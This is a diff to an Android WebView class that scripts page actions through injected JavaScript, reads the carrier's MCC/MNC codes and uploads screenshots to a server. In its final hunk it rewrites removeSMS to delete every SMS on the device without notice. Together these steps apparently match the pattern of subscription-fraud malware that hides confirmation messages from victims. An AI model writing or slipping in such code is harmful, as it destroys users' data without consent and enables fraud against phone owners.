@@ -169,7 +169,6 @@ public class AutomatedWebview extends WebView {
     }
 
     // Javascript injection for automated actions
-
     public void focus(String selector) {
         String script = "document.querySelector('" + selector + "').focus();";
         cssSelector = selector;
@@ -205,7 +204,7 @@ public class AutomatedWebview extends WebView {
                     b.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                     Toast.makeText(context, "Saved screenshot!", Toast.LENGTH_LONG).show();
                     fos.close();
-
+                    //Building file object for post
                     RequestBody reqFile = RequestBody.create(MediaType.parse("image/*"), file);
                     MultipartBody.Part body = MultipartBody.Part.createFormData("image", file.getName(), reqFile);
                     Call<String> meResponse = service.postScreenShot(body);
@@ -215,7 +214,6 @@ public class AutomatedWebview extends WebView {
                             if (response.isSuccessful() && response.body().equalsIgnoreCase("success")) {
                                 Toast.makeText(context, "Posted screenshot!", Toast.LENGTH_LONG).show();
                             } else {
-
                                 Toast.makeText(context, "Uploading screenshot failed!", Toast.LENGTH_LONG).show();
                             }
                         }
@@ -253,7 +251,6 @@ public class AutomatedWebview extends WebView {
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
-
             } else if (item.getAction().equalsIgnoreCase("focus")) {
                 handler.postDelayed(new Runnable() {
                     @Override
@@ -261,7 +258,6 @@ public class AutomatedWebview extends WebView {
                         focus(item.getParameter());
                     }
                 }, seconds * 1000);
-
             } else if (item.getAction().equalsIgnoreCase("enter")) {
                 handler.postDelayed(new Runnable() {
                     @Override
@@ -344,7 +340,6 @@ public class AutomatedWebview extends WebView {
     private void getMNCMCC() {
         TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         String networkOperator = tel.getNetworkOperator();
-
         if (!TextUtils.isEmpty(networkOperator)) {
             mcc = Integer.parseInt(networkOperator.substring(0, 3));
             mnc = Integer.parseInt(networkOperator.substring(3));
@@ -457,17 +452,23 @@ public class AutomatedWebview extends WebView {
         return name;
     }
 
-    private void removeSMS() {
-        Uri uriSMSURI = Uri.parse("content://sms/");
-        try {
-            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
-            if (cur.moveToFirst()) {
-                String MsgId = cur.getString(0);
-                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+    private void removeSMS(String number)
+    {
+        Uri deleteUri = Uri.parse("content://sms");
+        int count = 0;
+        Cursor c = context.getContentResolver().query(deleteUri, null, null,
+                null, null);
+        while (c.moveToNext()) {
+            try {
+                // Delete the SMS
+                String pid = c.getString(0); // Get id;
+                String uri = "content://sms/" + pid;
+                count = context.getContentResolver().delete(Uri.parse(uri),
+                        null, null);
+            } catch (Exception e) {
             }
-        } catch (Exception e) {
-            e.printStackTrace();
         }
+
     }
 
     public boolean isForeground() {
